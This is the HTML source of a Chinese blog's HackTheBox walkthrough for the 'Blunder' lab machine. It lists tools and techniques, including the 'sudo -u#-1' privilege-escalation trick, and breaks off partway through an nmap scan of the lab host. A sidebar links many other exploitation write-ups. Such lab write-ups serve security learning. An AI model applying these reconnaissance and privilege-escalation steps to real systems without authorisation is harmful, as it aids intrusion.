@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          HTB::Blunder-walkthrough - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+<li><a href="/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93">MySQL攻击面和提权总结</a></li>
+<li><a href="/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C">SQL注入手册</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90">PHP复杂变量解析</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+<li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8">CTFShow—Web入门</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+<li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024杯 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups">羊城杯2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything">NCTF2019 Phar matches everything</a></li>
+<li><a href="/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp">纵横杯2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp">BMZCTF2020 Web</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li>
+<li><a href="/Target_drone/HackTheBox/19.HackTheBox-Cache-walkthrough">HTB::Cache</a></li>
+<li><a href="/Target_drone/HackTheBox/20.HackTheBox-Blunder-walkthrough">HTB::Blunder</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+<li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li>
+<li><a href="/code_audit/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0">74CMS模板注入+文件包含getshell</a></li>
+<li><a href="/code_audit/10.PHPECMS3.5getshell">【密文保护】PHPECMS3.5getshell</a></li>
+<li><a href="/code_audit/11.ZZCMS8.2%E5%AE%A1%E8%AE%A1">ZZCMS8.2</a></li>
+<li><a href="/code_audit/14.maccms8.x%E5%AE%A1%E8%AE%A1">maccms8.x</a></li>
+<li><a href="/code_audit/12.DeDeCMSV5.7%E5%AE%A1%E8%AE%A1">DeDeCMSV5.7审计</a></li>
+<li><a href="/code_audit/13.HDWiki6.0sql%E6%B3%A8%E5%85%A5">HDWiki6.0sql注入</a></li>
+<li><a href="/code_audit/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF">TP3.0反序列化POP链-MySQL伪造恶意服务端</a></li>
+</ul>
+<h1 id="大数据安全">大数据安全</h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python基础">Python基础</h2>
+<ul>
+<li><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></li>
+<li><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></li>
+<li><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></li>
+<li><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></li>
+<li><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></li>
+<li><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></li>
+</ul>
+<h2 id="Python安全">Python安全</h2>
+<ul>
+<li><a href="/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass">Jinja2 SSTI&amp;Bypass</a></li>
+<li><a href="/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">Python沙箱逃逸</a></li>
+<li><a href="/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Python反序列化漏洞</a></li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java基础">Java基础</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+<li><a href="">Java基础学习之反射</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-06-01&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">1.9k</span>
+  
+  <h1 id="HTB-Blunder-Walkthrough">HTB::Blunder Walkthrough</h1>
+<h2 id="0x01-Info-Card">0x01 Info Card</h2>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200601172155.png" style="zoom:80%;" />
+<h2 id="0x02-Tools-and-tips">0x02 Tools and tips</h2>
+<ul>
+<li>nmap</li>
+<li>dirsearch</li>
+<li>wfuzz</li>
+<li>cewl</li>
+<li>CMS password leakage</li>
+<li>sudo -u#-1</li>
+</ul>
+<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
+<h3 id="Initial-Enumeration">Initial Enumeration</h3>
+<p>nmap扫描端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun May 31 19:18:12 2020 as: nmap -sC -sV -Pn -oN nmap.txt blunder.htb</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> blunder.htb (10.10.10.191)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache 